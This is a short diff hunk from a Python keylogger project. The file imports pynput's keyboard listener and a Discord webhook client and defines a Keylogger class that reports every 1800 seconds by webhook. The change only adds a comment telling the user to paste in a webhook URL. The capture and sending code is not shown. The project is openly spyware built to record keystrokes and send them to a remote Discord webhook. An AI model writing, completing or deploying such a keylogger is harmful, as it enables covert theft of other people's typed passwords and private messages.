@@ -5,7 +5,7 @@ import pynput
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from pynput import keyboard
 
-WEBHOOK = "WEBHOOK_URL"
+WEBHOOK = "WEBHOOK_URL"  #Enter webhook url here.
 class Keylogger:
     def __init__(self, time_interval=1800, report_method="webhook"):
         self.log = "Keylogger Started"
